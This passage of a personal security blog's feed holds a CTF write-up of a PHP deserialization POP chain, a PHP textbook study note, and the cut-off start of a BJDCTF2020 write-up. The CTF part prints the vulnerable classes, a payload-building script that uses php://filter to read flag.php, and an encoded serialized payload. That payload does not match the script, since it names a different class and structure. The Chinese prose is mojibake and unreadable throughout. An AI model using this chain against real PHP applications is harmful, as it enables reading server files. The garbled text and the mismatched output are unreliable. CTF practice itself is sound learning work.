class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæˆ‘åœ¨æŠŠæ–‡ä»¶æ”¾è¿›seayå®¡è®¡ç³»ç»Ÿé‡Œè·‘çš„æ—¶å€™å°±è·‘å‡ºäº†</p><p>includeæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè€Œè€…ä¹Ÿæ˜¯æˆ‘ä»¬æœ€åè¦è¾¾æˆçš„ç›®çš„ï¼š</p><p>åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å’Œphpä¼ªåè®®æ¥è¯»å–flagæ–‡ä»¶</p><p>è¿™é‡Œè¿˜æœ‰é­”æ³•æ–¹æ³•<strong>__invoke</strong> ï¼Œå½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ï¼Œæ‰€ä»¥åœ¨è„šæœ¬ä¸­è¦æŠŠModifierç±»è°ƒç”¨ä¸ºå‡½æ•°ã€‚</p><p>2.Showç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°äº†è¿™é‡Œçš„_wakeup()å‡½æ•°ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ä¸€å®šä¼šé¦–å…ˆè°ƒç”¨å…¶å‡½æ•°ï¼Œè¿‡æ»¤äº†ä¸è€å°‘å…³é”®å­—ï¼Œä½†æ˜¯åƒfilter://ä¼ªåè®®å´æ²¡æœ‰è¿‡æ»¤ã€‚</p><p>è€Œ_toStringæŠŠç±»å½“ä½œå­—ç¬¦ä¸²æ—¶è§¦å‘</p><p>æ‰€ä»¥å¾—å‡ºwakeupæ–¹æ³•å¯ä»¥è§¦å‘tostringæ–¹æ³•</p><p>3.Testç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰é­”æ³•æ–¹æ³•ï¼š<strong>__get</strong> ä»ä¸å¯è®¿é—®çš„å±æ€§ä¸­è¯»å–æ•°æ®ä¼šè§¦å‘<br>ä¼šè¿”å›functionä½œä¸ºå‡½æ•°è°ƒç”¨ã€‚</p><p>æ€è·¯å¾—å‡ºï¼š</p><p>â€‹        é¦–å…ˆååºåˆ—åŒ–å‡½æ•°ï¼Œè§¦å‘Showç±»ä¸­çš„wakeupæ–¹æ³•ï¼Œwakeupæ–¹æ³•åšå­—ç¬¦ä¸²å¤„ç†ï¼Œè§¦å‘tosringæ–¹æ³•ï¼Œå¦‚æœå°†strå®ä¾‹åŒ–ä¸ºTestï¼Œå› ä¸ºTestç±»ä¸­ä¸å«sourceå±æ€§ï¼Œæ‰€ä»¥è°ƒç”¨getæ–¹æ³•ï¼Œå°†functionå®ä¾‹åŒ–ä¸ºModifierç±»ï¼Œå³å¯è§¦å‘å…¶ä¸­invokeæ–¹æ³•ï¼Œæœ€ç»ˆè°ƒç”¨æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œè¯»å–flag.php</p><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;karsa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Show(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">$a-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">$b = <span class="keyword">new</span> Show($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3Ba%3A1%3A%7Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A4%3A%22Read%22%3A1%3A%7Bs%3A3%3A%22var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure><p><img src="/2021/09/03/buu/19/image-20210904213507487.png" alt="image-20210904213507487"></p><p><img src="/2021/09/03/buu/19/image-20210904214001095.png" alt="image-20210904214001095"></p><h4 id="0x01çŸ¥è¯†ç‚¹"><a href="#0x01çŸ¥è¯†ç‚¹" class="headerlink" title="0x01çŸ¥è¯†ç‚¹"></a>0x01çŸ¥è¯†ç‚¹</h4><p>é€šè¿‡è¿™é¢˜å¥½å¥½å†æ¶è¡¥ä¸€æ¬¡æˆ‘çš„ä»£ç å®¡è®¡</p><h5 id="1-this-gt-p"><a href="#1-this-gt-p" class="headerlink" title="1.$this-&gt;p"></a>1.$this-&gt;p</h5><p>æ‘˜æŠ„äºä¸€ç¯‡æ–‡ç« ï¼š<a href="https://www.cnblogs.com/ytkah/p/9633690.html">https://www.cnblogs.com/ytkah/p/9633690.html</a></p><p>phpä¸­$this-&gt;çš„ç”¨æ³•ç®€å•ä»‹ç»</p><p>phpä¸­æˆ‘ä»¬ä¸€èˆ¬æ˜¯å…ˆå£°æ˜ä¸€ä¸ªç±»ï¼Œç„¶åç”¨è¿™ä¸ªç±»å»å®ä¾‹åŒ–å¯¹è±¡</p><p>$thisçš„å«ä¹‰æ˜¯è¡¨ç¤ºå®ä¾‹åŒ–åçš„å…·ä½“å¯¹è±¡</p><p>$this-&gt;è¡¨ç¤ºåœ¨ç±»æœ¬èº«å†…éƒ¨ä½¿ç”¨æœ¬ç±»çš„å±æ€§æˆ–è€…æ–¹æ³•</p><p>â€˜ -&gt; â€™ ç¬¦å·æ˜¯æ’å…¥å¼è§£å¼•ç”¨æ“ä½œç¬¦ã€‚</p><p>æ¢å¥è¯è¯´ï¼Œå®ƒæ˜¯æœ‰è°ƒç”¨ç”±å¼•ç”¨ä¼ é€’å‚æ•°çš„å­ç¨‹åºçš„æ–¹æ³•</p><p>ä¾‹å­ï¼š</p><p>æ¯”å¦‚æˆ‘ä»¬å£°æ˜ä¸€ä¸ªUserç±»ï¼Œå®ƒåªå«æœ‰ä¸€ä¸ªå±æ€§ $name</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $_name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œæˆ‘ä»¬ç»™Userç±»åŠ ä¸ªæ–¹æ³•ï¼Œå°±ç”¨getName()æ–¹æ³•ï¼Œè¾“å‡º$nameçš„å€¼å§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $_name;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¦‚ä½•ä½¿ç”¨å‘¢ï¼Ÿ</span></span><br><span class="line">$user1 = <span class="keyword">new</span> User();</span><br><span class="line">$user1-&gt;name = <span class="string">&#x27;å¼ ä¸‰&#x27;</span>;</span><br><span class="line">$user1-&gt;getName();        <span class="comment">//è¿™é‡Œå°±ä¼šè¾“å‡ºå¼ ä¸‰ï¼</span></span><br><span class="line">$user2 = <span class="keyword">new</span> User();</span><br><span class="line">$user2-&gt;name = <span class="string">&#x27;æå››&#x27;</span>;  </span><br><span class="line">$user2-&gt;getName();       <span class="comment">//è¿™é‡Œä¼šè¾“å‡ºæå››ï¼</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä¹Ÿä¸Šåœ¨çº¿å·¥å…·è¯•äº†ä¸‹</p><p><img src="/2021/09/03/buu/19/image-20210905155102186.png" alt="image-20210905155102186"></p><h5 id="2-PHPä¸­çš„é­”æœ¯æ–¹æ³•"><a href="#2-PHPä¸­çš„é­”æœ¯æ–¹æ³•" class="headerlink" title="2.PHPä¸­çš„é­”æœ¯æ–¹æ³•"></a>2.PHPä¸­çš„é­”æœ¯æ–¹æ³•</h5><p><a href="https://blog.csdn.net/weixin_45645113/article/details/105309695">https://blog.csdn.net/weixin_45645113/article/details/105309695</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__sleep() &#x2F;&#x2F;ä½¿ç”¨serializeæ—¶è§¦å‘</span><br><span class="line">__destruct() &#x2F;&#x2F;å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span><br><span class="line">__call() &#x2F;&#x2F;åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__callStatic() &#x2F;&#x2F;åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__get() &#x2F;&#x2F;ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span><br><span class="line">__set() &#x2F;&#x2F;ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><br><span class="line">__isset() &#x2F;&#x2F;åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span><br><span class="line">__unset() &#x2F;&#x2F;åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span><br><span class="line">__toString() &#x2F;&#x2F;æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span><br><span class="line">__invoke() &#x2F;&#x2F;å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span><br></pre></td></tr></table></figure><h5 id="3-è¿›ä¸€æ­¥ç†è§£æœ¬é¢˜ä»£ç "><a href="#3-è¿›ä¸€æ­¥ç†è§£æœ¬é¢˜ä»£ç " class="headerlink" title="3.è¿›ä¸€æ­¥ç†è§£æœ¬é¢˜ä»£ç "></a>3.è¿›ä¸€æ­¥ç†è§£æœ¬é¢˜ä»£ç </h5><p>_invoke()å‡½æ•°ï¼šå¯¹è±¡æœ¬èº«æ˜¯ä¸èƒ½å¤Ÿå½“ä½œå‡½æ•°ä½¿ç”¨çš„ï¼Œä¸€æ—¦è¢«å½“ä½œå‡½æ•°ä½¿ç”¨ï¼Œï¼Œå°±ä¼šå›è°ƒæ‰§è¡Œ _invoke()æ–¹æ³•</p><p>_construct()å‡½æ•°ï¼šæ„é€ å‡½æ•°/æ–¹æ³•</p><p>æ„é€ å‡½æ•°ï¼ˆconstructor methodï¼Œä¹Ÿç§°ä¸ºæ„é€ å™¨ï¼‰æ˜¯ç±»ä¸­çš„ä¸€ç§ç‰¹æ®Šå‡½æ•°ï¼Œå½“ä½¿ç”¨ new å…³é”®å­—å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œæ„é€ å‡½æ•°å°†ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __construct(å‚æ•°åˆ—è¡¨)&#123;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_get()å‡½æ•°ï¼š è®¿é—®ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡æ—¶è§¦å‘</p><p>ä½œè€…è¿™æ®µè¯ä»Šå¤©çœ‹æ‡‚äº†ç‚¹</p><p><img src="/2021/09/03/buu/19/image-20210905161234966.png" alt="image-20210905161234966"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x00è§£é¢˜&quot;&gt;&lt;a href=&quot;#0x00è§£é¢˜&quot; class=&quot;headerlink&quot; title=&quot;0x00è§£é¢˜&quot;&gt;&lt;/a&gt;0x00è§£é¢˜&lt;/h4&gt;&lt;p&gt;å€Ÿé‰´åšå®¢&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/weixin_4395</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>PHP and MySQL Web Development(ä¸€)</title>
    <link href="http://daweitech.github.io/2021/09/03/php/1/"/>
    <id>http://daweitech.github.io/2021/09/03/php/1/</id>
    <published>2021-09-03T02:51:22.000Z</published>
    <updated>2021-09-04T07:31:12.242Z</updated>
    
    <content type="html"><![CDATA[<p> ä»åˆ›å»ºç¤ºä¾‹Webåº”ç”¨å¼€å§‹ï¼šBobçš„æ±½è½¦é›¶éƒ¨ä»¶å•†åº—</p><p>åˆ›å»ºè®¢å•è¡¨å•ï¼š</p><p>ä»»ä½•æœåŠ¡å™¨ç«¯è„šæœ¬è¯­è¨€æœ€å¸¸è§çš„åº”ç”¨åœºæ™¯æ˜¯ä¹‹ä¸€</p><p>1.1</p><p>å°±æ˜¯å¤„ç†HTMLè¡¨å•ã€‚</p><p>æ¥ä¸‹æ¥ç¨‹åºæ¸…å•1-1ï¼šorder.htmlï¼Œå•†åº—åŸºç¡€HTMLä»£ç </p><p><img src="/2021/09/03/php/1/image-20210903110152375.png" alt="image-20210903110152375"></p><p>å‘ˆç°ç”»é¢</p><form action="processorder.php" method="post"><table style="border: 0px;"><tr style="background: #cccccc;">    <td style="width: 150px; text-align: center;">Item</td>    <td style="width: 15px; text-align: center;">Quantity</td></tr><tr>    <td>Tries</td>    <td><input type="text" name="tireqty" size="3" maxlength="3"></td></tr><tr>    <td>Oil</td>    <td><input type="text" name="oilqty" size="3" maxlength="3"></td></tr><tr>    <td>Spark Plugs</td>    <td><input type="text" name="sparkqty" size="3" maxlength="3"></td></tr><tr>    <td colspan="2" style="text-align" : center;"><input type="submit" value="Submit Order"></td>    </tr>    </table>    </form><p>æ³¨æ„ï¼šè¯¥è¡¨å•çš„actionå±æ€§è¢«è®¾ç½®ä¸ºèƒ½å¤Ÿå¤„ç†å®¢æˆ·è®¢å•çš„PHPè„šæœ¬åç§°ï¼Œåç»­ä¼šå¯¹è¯¥è„šæœ¬è¿›è¡Œå¢æ·»ã€‚</p><p>ä¸€èˆ¬åœ°ï¼Œactionså±æ€§å°±æ˜¯ç”¨æˆ·ç‚¹å‡»æäº¤æŒ‰é’®æ—¶å°†è¦è½½å…¥çš„URL</p><p>ç”¨æˆ·åœ¨è¡¨å•ä¸­è¾“å…¥çš„æ•°æ®å°†æŒ‰ç…§methodå±æ€§ä¸­æŒ‡å®šçš„HTTPæ–¹æ³•å‘é€åˆ°è¿™ä¸ªURLï¼Œè¯¥æ–¹æ³•æ˜¯getï¼ˆé™„åŠ åœ¨URLçš„ç»“å°¾ï¼‰æˆ–è€…postï¼ˆä»¥å•ç‹¬çš„ä¿¡æ¯å‘é€ï¼‰ã€‚</p><p>1.2</p><p>è¡¨å•çš„å¤„ç†ï¼Œéœ€è¦åˆ›å»ºåœ¨formæ ‡è®°çš„actionå±æ€§ä¸­æŒ‡å®šçš„å¤„ç†è„šæœ¬ï¼Œè¯¥è„šæœ¬ä¸ºprocessorder.phpï¼Œä»£ç å¦‚ä¸‹</p><p><img src="/2021/09/03/php/1/image-20210903110937097.png" alt="image-20210903110937097"></p><p>æˆ‘ä»¬åœ¨h2å¤„æ·»åŠ äº†phpä»£ç </p><p>è¿™æ ·æˆ‘ä»¬çœ‹åˆ°phpçš„echoè¾“å‡ºè¯­å¥åŒæ—¶ï¼Œ</p><p>åœ¨htmlé¡µé¢ç‚¹å‡»Submit Orderä¹Ÿä¼šæœ‰ç±»ä¼¼å†…å®¹æ˜¾ç¤º</p><p><img src="/2021/09/03/php/1/image-20210903150404934.png" alt="image-20210903150404934"></p><p>è¯·æ³¨æ„</p><p>æˆ‘ä»¬æ‰€ç¼–å†™çš„PHPä»£ç æ˜¯å¦‚ä½•åµŒå…¥åˆ°ä¸€ä¸ªå¸¸è§çš„HTMLæ–‡ä»¶ä¸­çš„</p><p>é€šè¿‡æµè§ˆå™¨ï¼Œæˆ‘ä»¬æŸ¥çœ‹è¯¥HTMLçš„æºä»£ç </p><p><img src="/2021/09/03/php/1/image-20210903150637332.png" alt="image-20210903150637332"></p><p>ä»¥ä¸Šä»£ç å¹¶æ²¡æœ‰æ˜¾ç¤ºåŸå§‹çš„PHPè¯­å¥</p><p>è¿™æ˜¯å› ä¸ºPHPè§£é‡Šå™¨å·²ç»è¿è¡Œäº†è¯¥è„šæœ¬ï¼Œå¹¶ä¸”ç”¨è¯¥è„šæœ¬çš„è¾“å‡ºä»£æ›¿äº†è„šæœ¬çš„æœ¬èº«ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡PHPï¼Œæˆ‘ä»¬å¯ä»¥ç”Ÿæˆèƒ½åœ¨ä»»ä½•æµè§ˆå™¨ä¸­æŸ¥çœ‹çš„çº¯HTMLï¼Œæ¢ä¸€ä¸ªæ„æ€ç†è§£ï¼Œç”¨æˆ·çš„æµè§ˆå¹¶ä¸éœ€è¦ç†è§£PHPã€‚</p><p>æ­¤æ–‡ä»¶ç»„æˆï¼š</p><p>1.HTML 2.PHPæ ‡è®° 3.PHPè¯­å¥ 4.ç©ºæ ¼</p><p>1.3.1</p><p>PHPæ ‡è®°</p><?php    ä¸ºå¼€å§‹ï¼Œ?><p>ä¸ºç»“æŸ</p><p>â€‹        è¿™æ ·çš„æ ‡è®°ç§°ä½œPHPæ ‡è®°ï¼Œå¯ä»¥å‘Šè¯‰æœåŠ¡å™¨PHPä»£ç çš„å¼€å§‹å’Œç»“æŸã€‚</p><p>XMLé£æ ¼(å»ºè®®ä½¿ç”¨)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br></pre></td></tr></table></figure><p>ç®€çŸ­é£æ ¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br></pre></td></tr></table></figure><p>1.3.2</p><p>PHPè¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;;</span><br></pre></td></tr></table></figure><p>echoè¯­å¥ï¼šå°†ä¼ é€’ç»™å…¶è‡ªèº«çš„å­—ç¬¦ä¸²æ‰“å°æˆ–è€…å›æ˜¾åˆ°æµè§ˆå™¨</p><p>1.7.1</p><p>PHPçš„æ•°æ®ç±»å‹</p><p>1.æ•´æ•°    Integer</p><p>2.æµ®ç‚¹æ•°    Float</p><p>3.å­—ç¬¦ä¸²    String</p><p>4.å¸ƒå°”    Boolean</p><p>5.æ•°ç»„    Array</p><p>6.å¯¹è±¡    Object</p><p>é™„ï¼šä¸‰ä¸ªç‰¹æ®Šç±»å‹ NULLï¼ˆç©ºï¼‰ã€resourceï¼ˆèµ„æºï¼‰ã€</p><p>callable ã€‚</p><p>1.7.2</p><p>ç±»å‹å¼ºåº¦</p><p>PHPæ˜¯ä¸€ç§å¼±ç±»å‹ï¼Œæˆ–è€…åŠ¨æ€å‹è¯­è¨€</p><p>ä¾‹å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$total1 &#x3D; 0;</span><br><span class="line"></span><br><span class="line">$total2 &#x3D; 0.00;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œ$total1æ˜¯ä¸€ä¸ªæ•´æ•°ç±»å‹çš„å˜é‡</p><p>è€Œ$total2æ˜¯ä¸€ä¸ªæµ®ç‚¹ç±»å‹çš„å˜é‡ã€‚</p><p>è‹¥æ·»åŠ ä»¥ä¸‹ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$total2 &#x3D; &#39;Hello&#39;;</span><br></pre></td></tr></table></figure><p>åˆ™$total2æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„å˜é‡ã€‚</p><p>1.7.3</p><p>ç±»å‹è½¬æ¢</p><p>1.7.4</p><p>å¯å˜å˜é‡</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; ä»åˆ›å»ºç¤ºä¾‹Webåº”ç”¨å¼€å§‹ï¼šBobçš„æ±½è½¦é›¶éƒ¨ä»¶å•†åº—&lt;/p&gt;
&lt;p&gt;åˆ›å»ºè®¢å•è¡¨å•ï¼š&lt;/p&gt;
&lt;p&gt;ä»»ä½•æœåŠ¡å™¨ç«¯è„šæœ¬è¯­è¨€æœ€å¸¸è§çš„åº”ç”¨åœºæ™¯æ˜¯ä¹‹ä¸€&lt;/p&gt;
&lt;p&gt;1.1&lt;/p&gt;
&lt;p&gt;å°±æ˜¯å¤„ç†HTMLè¡¨å•ã€‚&lt;/p&gt;
&lt;p&gt;æ¥ä¸‹æ¥ç¨‹åºæ¸…å•1-1ï¼šorder.htmlï¼Œå•†åº—åŸºç¡€HTML</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2020 EasySearch</title>
    <link href="http://daweitech.github.io/2021/09/02/buu/18/"/>
    <id>http://daweitech.github.io/2021/09/02/buu/18/</id>
    <published>2021-09-02T11:56:57.000Z</published>
    <updated>2021-09-02T12:57:15.636Z</updated>
    
    <content type="html"><![CDATA[<p> å‚è€ƒåšå®¢ï¼š</p><p><a href="https://blog.csdn.net/devilare/article/details/119351945">https://blog.csdn.net/devilare/article/details/119351945</a>    </p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)">https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)</a></p><p>æ‰“å¼€ååªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†</p><p>å°è¯•äº†ä¸€ä¸‹sqlæ³¨å…¥</p><p>åªä¼šå‡ºç°ä¸€æ ·çš„å¼¹æ¡†</p><p><img src="/2021/09/02/buu/18/image-20210902195901927.png" alt="image-20210902195901927"></p><p>æ‰«æç›®å½•åå‘ç°è¿˜æœ‰swpæ–‡ä»¶</p><p>è®¿é—®å¾—åˆ°æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 